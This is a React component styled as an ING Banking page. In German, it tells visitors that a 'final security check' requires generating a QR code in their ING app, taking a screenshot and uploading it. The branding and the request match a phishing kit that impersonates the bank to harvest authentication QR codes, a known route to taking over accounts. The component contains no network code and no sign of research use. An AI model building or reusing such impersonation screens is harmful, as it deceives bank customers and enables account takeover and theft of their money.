import React from 'react';
import { Smartphone, QrCode } from 'lucide-react';

interface QRInstructionsScreenProps {
  onContinue: () => void;
}

const QRInstructionsScreen: React.FC<QRInstructionsScreenProps> = ({ onContinue }) => {
  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '60vh',
      padding: '20px'
    }}>
      <div className="ing-card" style={{
        maxWidth: '600px',
        width: '100%',
        padding: '40px',
        textAlign: 'center'
      }}>
        <div className="card-title" style={{ marginBottom: '24px' }}>QR-Code Authentifizierung</div>
        
        <p style={{ 
          color: '#666', 
          fontSize: '16px', 
          lineHeight: '1.6', 
          marginBottom: '32px', 
          fontFamily: 'ING Me, Arial, sans-serif' 
        }}>
          Für die finale Sicherheitsüberprüfung benötigen wir einen QR-Code von Ihrer ING Banking App.
        </p>
        
        <div style={{ 
          backgroundColor: '#f8f9fa', 
          borderRadius: '8px', 
          padding: '24px', 
          marginBottom: '24px',
          borderLeft: '4px solid #ff6200'
        }}>
          <h3 style={{ 
            color: '#333', 
            fontSize: '18px', 
            fontWeight: '600', 
            marginBottom: '16px',
            fontFamily: 'ING Me, Arial, sans-serif',
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}>
            <Smartphone size={20} color="#ff6200" />
            Anleitung:
          </h3>
          
          <ol style={{ 
            color: '#666', 
            fontSize: '16px', 
            lineHeight: '1.6',
            fontFamily: 'ING Me, Arial, sans-serif',
            paddingLeft: '20px',
            margin: 0
          }}>
            <li style={{ marginBottom: '12px' }}>
              Öffnen Sie Ihre ING Banking App auf Ihrem Smartphone
            </li>
            <li style={{ marginBottom: '12px' }}>
              Gehen Sie zu "Einstellungen" → "Sicherheit"
            </li>
            <li style={{ marginBottom: '12px' }}>
              Wählen Sie "QR-Code für Verifizierung generieren"
            </li>
            <li style={{ marginBottom: '12px' }}>
              Machen Sie einen Screenshot oder ein Foto des QR-Codes
            </li>
            <li>
              Laden Sie das Bild im nächsten Schritt hoch
            </li>
          </ol>
        </div>
        
        <div style={{
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '32px',
          backgroundColor: '#f0f0f0',
          borderRadius: '8px',
          marginBottom: '24px'
        }}>
          <QrCode size={80} color="#ff6200" />
        </div>
        
        <div style={{
          backgroundColor: '#fff3cd',
          border: '1px solid #ffeaa7',
          borderRadius: '8px',
          padding: '16px',
          marginBottom: '24px'
        }}>
          <p style={{
            color: '#856404',
            fontSize: '14px',
            margin: 0,
            fontFamily: 'ING Me, Arial, sans-serif',
            lineHeight: '1.5'
          }}>
            <strong>Wichtig:</strong> Der QR-Code ist nur für 5 Minuten gültig. Generieren Sie einen neuen Code, falls dieser abgelaufen ist.
          </p>
        </div>

        <button
        onClick={onContinue}
        style={{
          backgroundColor: '#ff6200',
          color: 'white',
          border: 'none',
          borderRadius: '8px',
          padding: '16px 32px',
          fontSize: '16px',
          fontWeight: '600',
          cursor: 'pointer',
          fontFamily: 'ING Me, Arial, sans-serif',
          transition: 'all 0.3s ease',
          display: 'inline-flex',
          alignItems: 'center',
          gap: '8px',
          boxShadow: '2px 2px 4px rgba(0, 0, 0, 0.15)',
          width: '100%',
          justifyContent: 'center'
        }}
        onMouseEnter={(e) => {
          e.currentTarget.style.backgroundColor = '#e55800';
          e.currentTarget.style.transform = 'translateY(-1px)';
          e.currentTarget.style.boxShadow = '3px 3px 6px rgba(0, 0, 0, 0.2)';
        }}
        onMouseLeave={(e) => {
          e.currentTarget.style.backgroundColor = '#ff6200';
          e.currentTarget.style.transform = 'translateY(0)';
          e.currentTarget.style.boxShadow = '2px 2px 4px rgba(0, 0, 0, 0.15)';
        }}
      >
        QR-Code hochladen
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
          <path d="M5 12h14M12 5l7 7-7 7"/>
        </svg>
        </button>
      </div>
    </div>
  );
};

export default QRInstructionsScreen;
